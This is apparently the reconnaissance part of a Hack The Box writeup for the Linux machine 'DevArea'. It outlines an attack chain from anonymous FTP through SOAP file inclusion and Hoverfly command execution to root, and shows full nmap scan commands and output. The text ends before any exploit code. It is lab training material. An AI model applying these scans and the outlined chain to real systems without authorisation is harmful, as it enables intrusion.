---
title: 'DevArea - Hack The Box Writeup (Linux, Medium)'
description: 'DevArea HTB Machine Writeup - exploitation walkthrough and key steps'
date: 2026-04-25T00:00:00+01:00
tags: ['HTB', 'Linux', 'Writeup', 'Medium']
authors: ['mensi']
image: ../assets/htb/devarea/1.png
draft: false
maths: true
---

# HTB DevArea — Full Writeup with Dead Ends

## Introduction

DevArea was a chained machine that started with a seemingly simple FTP leak, but quickly turned into a multi-stage compromise:

- anonymous FTP exposed a Java service JAR
- the JAR revealed a SOAP endpoint
- SOAP was vulnerable through **XOP/MTOM file inclusion**
- the file read leaked Hoverfly credentials
- Hoverfly middleware gave command execution
- SysWatch sudo permissions led to root

What made this box interesting was not only the final exploit chain, but also the number of wrong turns along the way.

---

## 1. Reconnaissance

The first step was a full scan:

```bash
nmap -p- -sC -sV -A --reason -T4 --open --script=default,vuln -oA deep_scan 10.129.244.208
```

After what felt like Nmap compiling the internet ...

<img src="/assets/htb/devarea/sad-pablo-lonely.gif" width="550px" alt="oh-my-god">

the scan showed:

```
┌──(mensi㉿kali)-[~/Desktop]
└─$ nmap -p- -sC -sV -A --reason -T4 --open --script=default,vuln -oA deep_scan 10.129.244.208
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-25 08:38 -0400
Nmap scan report for devarea.htb (10.129.244.208)
Host is up, received echo-reply ttl 63 (0.081s latency).
Not shown: 65474 closed tcp ports (reset), 55 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:9.6p1:
|       PACKETSTORM:179290      10.0    https://vulners.com/packetstorm/PACKETSTORM:179290      *EXPLOIT*
|       1EEC8894-D2F7-547C-827C-915BE866875C    10.0    https://vulners.com/githubexploit/1EEC8894-D2F7-547C-827C-915BE866875C  *EXPLOIT*
|       09B905C6-CD97-54E6-AD97-B0DD1AC4771B    10.0    https://vulners.com/githubexploit/09B905C6-CD97-54E6-AD97-B0DD1AC4771B  *EXPLOIT*
|       33D623F7-98E0-5F75-80FA-81AA666D1340    9.8     https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340  *EXPLOIT*
|       F8981437-1287-5B69-93F1-657DFB1DCE59    9.3     https://vulners.com/githubexploit/F8981437-1287-5B69-93F1-657DFB1DCE59  *EXPLOIT*
|       CB2926E1-2355-5C82-A42A-D4F72F114F9B    9.3     https://vulners.com/githubexploit/CB2926E1-2355-5C82-A42A-D4F72F114F9B  *EXPLOIT*
|       B6C4923E-8565-5D3E-8E68-8D182C3DAD5C    9.3     https://vulners.com/githubexploit/B6C4923E-8565-5D3E-8E68-8D182C3DAD5C  *EXPLOIT*
|       8DEE261C-33D4-5057-BA46-E4293B705BAE    9.3     https://vulners.com/githubexploit/8DEE261C-33D4-5057-BA46-E4293B705BAE  *EXPLOIT*
|       6FD8F914-B663-533D-8866-23313FD37804    9.3     https://vulners.com/githubexploit/6FD8F914-B663-533D-8866-23313FD37804  *EXPLOIT*
|       PACKETSTORM:190587      8.1     https://vulners.com/packetstorm/PACKETSTORM:190587      *EXPLOIT*
|       FB2E9ED1-43D7-585C-A197-0D6628B20134    8.1     https://vulners.com/githubexploit/FB2E9ED1-43D7-585C-A197-0D6628B20134  *EXPLOIT*
|       FA3992CE-9C4C-5350-8134-177126E0BD3F    8.1     https://vulners.com/githubexploit/FA3992CE-9C4C-5350-8134-177126E0BD3F  *EXPLOIT*
|       EFD615F0-8F17-5471-AA83-0F491FD497AF    8.1     https://vulners.com/githubexploit/EFD615F0-8F17-5471-AA83-0F491FD497AF  *EXPLOIT*
|       EC20B9C2-6857-5848-848A-A9F430D13EEB    8.1     https://vulners.com/githubexploit/EC20B9C2-6857-5848-848A-A9F430D13EEB  *EXPLOIT*
|       EB13CBD6-BC93-5F14-A210-AC0B5A1D8572    8.1     https://vulners.com/githubexploit/EB13CBD6-BC93-5F14-A210-AC0B5A1D8572  *EXPLOIT*
|       E543E274-C20A-582A-8F8E-F8E3F381C345    8.1     https://vulners.com/githubexploit/E543E274-C20A-582A-8F8E-F8E3F381C345  *EXPLOIT*
|       E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257    8.1     https://vulners.com/githubexploit/E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257  *EXPLOIT*
|       E24EEC0A-40F7-5BBC-9E4D-7B13522FF915    8.1     https://vulners.com/githubexploit/E24EEC0A-40F7-5BBC-9E4D-7B13522FF915  *EXPLOIT*
|       DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346    8.1     https://vulners.com/githubexploit/DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346  *EXPLOIT*
|       DA18D761-BB81-54B6-85CB-CFD73CE33621    8.1     https://vulners.com/githubexploit/DA18D761-BB81-54B6-85CB-CFD73CE33621  *EXPLOIT*
|       D52370EF-02EE-507D-9212-2D8EA86CBA94    8.1     https://vulners.com/githubexploit/D52370EF-02EE-507D-9212-2D8EA86CBA94  *EXPLOIT*
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2024-6387   8.1     https://vulners.com/cve/CVE-2024-6387
|       CFEBF7AF-651A-5302-80B8-F8146D5B33A6    8.1     https://vulners.com/githubexploit/CFEBF7AF-651A-5302-80B8-F8146D5B33A6  *EXPLOIT*
|       C6FB6D50-F71D-5870-B671-D6A09A95627F    8.1     https://vulners.com/githubexploit/C6FB6D50-F71D-5870-B671-D6A09A95627F  *EXPLOIT*
|       C623D558-C162-5D17-88A5-4799A2BEC001    8.1     https://vulners.com/githubexploit/C623D558-C162-5D17-88A5-4799A2BEC001  *EXPLOIT*
|       C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0    8.1     https://vulners.com/githubexploit/C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0  *EXPLOIT*
|       C185263E-3E67-5550-B9C0-AB9C15351960    8.1     https://vulners.com/githubexploit/C185263E-3E67-5550-B9C0-AB9C15351960  *EXPLOIT*
|       BDA609DA-6936-50DC-A325-19FE2CC68562    8.1     https://vulners.com/githubexploit/BDA609DA-6936-50DC-A325-19FE2CC68562  *EXPLOIT*
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0  *EXPLOIT*
|       B1F444E0-F217-5FC0-B266-EBD48589940F    8.1     https://vulners.com/githubexploit/B1F444E0-F217-5FC0-B266-EBD48589940F  *EXPLOIT*
|       92254168-3B26-54C9-B9BE-B4B7563586B5    8.1     https://vulners.com/githubexploit/92254168-3B26-54C9-B9BE-B4B7563586B5  *EXPLOIT*
|       91752937-D1C1-5913-A96F-72F8B8AB4280    8.1     https://vulners.com/githubexploit/91752937-D1C1-5913-A96F-72F8B8AB4280  *EXPLOIT*
|       90104C60-A887-5437-8521-545277685F55    8.1     https://vulners.com/githubexploit/90104C60-A887-5437-8521-545277685F55  *EXPLOIT*
|       89F96BAB-1624-51B5-B09E-E771D918D1E6    8.1     https://vulners.com/githubexploit/89F96BAB-1624-51B5-B09E-E771D918D1E6  *EXPLOIT*
|       81F0C05A-8650-5DE8-97E9-0D89F1807E5D    8.1     https://vulners.com/githubexploit/81F0C05A-8650-5DE8-97E9-0D89F1807E5D  *EXPLOIT*
|       7C7167AF-E780-5506-BEFA-02E5362E8E48    8.1     https://vulners.com/githubexploit/7C7167AF-E780-5506-BEFA-02E5362E8E48  *EXPLOIT*
|       79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC    8.1     https://vulners.com/githubexploit/79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC  *EXPLOIT*
|       795762E3-BAB4-54C6-B677-83B0ACC2B163    8.1     https://vulners.com/githubexploit/795762E3-BAB4-54C6-B677-83B0ACC2B163  *EXPLOIT*
|       774022BB-71DA-57C4-9B8F-E21D667DE4BC    8.1     https://vulners.com/githubexploit/774022BB-71DA-57C4-9B8F-E21D667DE4BC  *EXPLOIT*
|       743E5025-3BB8-5EC4-AC44-2AA679730661    8.1     https://vulners.com/githubexploit/743E5025-3BB8-5EC4-AC44-2AA679730661  *EXPLOIT*
|       73A19EF9-346D-5B2B-9792-05D9FE3414E2    8.1     https://vulners.com/githubexploit/73A19EF9-346D-5B2B-9792-05D9FE3414E2  *EXPLOIT*
|       6E81EAE5-2156-5ACB-9046-D792C7FAF698    8.1     https://vulners.com/githubexploit/6E81EAE5-2156-5ACB-9046-D792C7FAF698  *EXPLOIT*
|       6B78D204-22B0-5D11-8A0C-6313958B473F    8.1     https://vulners.com/githubexploit/6B78D204-22B0-5D11-8A0C-6313958B473F  *EXPLOIT*
|       65650BAD-813A-565D-953D-2E7932B26094    8.1     https://vulners.com/githubexploit/65650BAD-813A-565D-953D-2E7932B26094  *EXPLOIT*
|       649197A2-0224-5B5C-9C4E-B5791D42A9FB    8.1     https://vulners.com/githubexploit/649197A2-0224-5B5C-9C4E-B5791D42A9FB  *EXPLOIT*
|       61DDEEE4-2146-5E84-9804-B780AA73E33C    8.1     https://vulners.com/githubexploit/61DDEEE4-2146-5E84-9804-B780AA73E33C  *EXPLOIT*
|       608FA50C-AEA1-5A83-8297-A15FC7D32A7C    8.1     https://vulners.com/githubexploit/608FA50C-AEA1-5A83-8297-A15FC7D32A7C  *EXPLOIT*
|       5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E    8.1     https://vulners.com/githubexploit/5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E  *EXPLOIT*
|       5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD    8.1     https://vulners.com/githubexploit/5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD  *EXPLOIT*
|       53BCD84F-BD22-5C9D-95B6-4B83627AB37F    8.1     https://vulners.com/githubexploit/53BCD84F-BD22-5C9D-95B6-4B83627AB37F  *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F  *EXPLOIT*
|       48603E8F-B170-57EE-85B9-67A7D9504891    8.1     https://vulners.com/githubexploit/48603E8F-B170-57EE-85B9-67A7D9504891  *EXPLOIT*
|       4748B283-C2F6-5924-8241-342F98EEC2EE    8.1     https://vulners.com/githubexploit/4748B283-C2F6-5924-8241-342F98EEC2EE  *EXPLOIT*
|       452ADB71-199C-561E-B949-FCDE6288B925    8.1     https://vulners.com/githubexploit/452ADB71-199C-561E-B949-FCDE6288B925  *EXPLOIT*
|       331B2B7F-FB25-55DB-B7A4-602E42448DB7    8.1     https://vulners.com/githubexploit/331B2B7F-FB25-55DB-B7A4-602E42448DB7  *EXPLOIT*
|       1FFDA397-F480-5C74-90F3-060E1FE11B2E    8.1     https://vulners.com/githubexploit/1FFDA397-F480-5C74-90F3-060E1FE11B2E  *EXPLOIT*
|       1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563    8.1     https://vulners.com/githubexploit/1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563  *EXPLOIT*
|       1F7A6000-9E6D-511C-B0F6-7CADB7200761    8.1     https://vulners.com/githubexploit/1F7A6000-9E6D-511C-B0F6-7CADB7200761  *EXPLOIT*
|       1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99    8.1     https://vulners.com/githubexploit/1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99  *EXPLOIT*
|       1AB9F1F4-9798-59A0-9213-1D907E81E7F6    8.1     https://vulners.com/githubexploit/1AB9F1F4-9798-59A0-9213-1D907E81E7F6  *EXPLOIT*
|       179F72B6-5619-52B5-A040-72F1ECE6CDD8    8.1     https://vulners.com/githubexploit/179F72B6-5619-52B5-A040-72F1ECE6CDD8  *EXPLOIT*
|       15C36683-070A-5CC1-B21F-5F0BF974D9D3    8.1     https://vulners.com/githubexploit/15C36683-070A-5CC1-B21F-5F0BF974D9D3  *EXPLOIT*
|       1337DAY-ID-39674        8.1     https://vulners.com/zdt/1337DAY-ID-39674        *EXPLOIT*
|       11F020AC-F907-5606-8805-0516E06160EE    8.1     https://vulners.com/githubexploit/11F020AC-F907-5606-8805-0516E06160EE  *EXPLOIT*
|       0FC4BE81-312B-51F4-9D9B-66D8B5C093CD    8.1     https://vulners.com/githubexploit/0FC4BE81-312B-51F4-9D9B-66D8B5C093CD  *EXPLOIT*
|       0B165049-2374-5E2A-A27C-008BEA3D13F7    8.1     https://vulners.com/githubexploit/0B165049-2374-5E2A-A27C-008BEA3D13F7  *EXPLOIT*
|       08144020-2B5F-5EB9-9286-1ABD5477278E    8.1     https://vulners.com/githubexploit/08144020-2B5F-5EB9-9286-1ABD5477278E  *EXPLOIT*
|       CVE-2026-35385  7.5     https://vulners.com/cve/CVE-2026-35385
|       CVE-2024-39894  7.5     https://vulners.com/cve/CVE-2024-39894
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       CVE-2025-26466  5.9     https://vulners.com/cve/CVE-2025-26466
|       B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF    5.9     https://vulners.com/githubexploit/B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF  *EXPLOIT*
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2026-35386  3.6     https://vulners.com/cve/CVE-2026-35386
|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  *EXPLOIT*
|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57  *EXPLOIT*
|       CVE-2026-35387  3.1     https://vulners.com/cve/CVE-2026-35387
|_      CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-title: DevArea - Connect with Top Development Talent
| vulners:
|   cpe:/a:apache:http_server:2.4.58:
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
|       0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8    7.5     https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8  *EXPLOIT*
|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
|       CVE-2024-36387  5.4     https://vulners.com/cve/CVE-2024-36387
|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
|_      CNVD-2024-36392 5.4     https://vulners.com/cnvd/CNVD-2024-36392
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Jetty 9.4.27.v20200227
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Error 404 Not Found
|_http-dombased-xss: Couldn't find any DOM based XSS.
8500/tcp open  http    syn-ack ttl 63 Golang net/http server
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 25 Apr 2026 12:39:50 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 25 Apr 2026 12:39:34 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-phpmyadmin-dir-traversal:
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd not found.
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter:
|
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-title: Hoverfly Dashboard
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=4/25%Time=69ECB605%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sat,\x2025\x20Apr\x202026\x2012:39:34
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sat,\x2025\x20Apr\x202026\x2012:39:34\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2025\x20Apr
SF:\x202026\x2012:39:50\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   103.10 ms 10.10.14.1
2   104.26 ms devarea.htb (10.129.244.208)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 596.20 seconds


```

The scan reveals several open services:

- `21/tcp` — FTP (`vsftpd 3.0.5`)
- `22/tcp` — SSH
- `80/tcp` — Apache web app
- `8080/tcp` — Jetty / SOAP service
- `8500/tcp` — proxy service
- `8888/tcp` — Hoverfly dashboard

Multiple web interfaces are present, requiring further enumeration on each endpoint.

## Faster Recon Scan

This is a quicker version of the scan because earlier I used a more detailed and slower enumeration approach to fully understand the target.

### Command

```bash id="cmd02"
nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.244.208
```

### Output

```text id="out02"

┌──(mensi㉿kali)-[~/Desktop]
└─$ nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.244.208
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-25 09:30 -0400
Nmap scan report for 10.129.244.208
Host is up (0.15s latency).
Not shown: 52602 closed tcp ports (reset), 12927 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
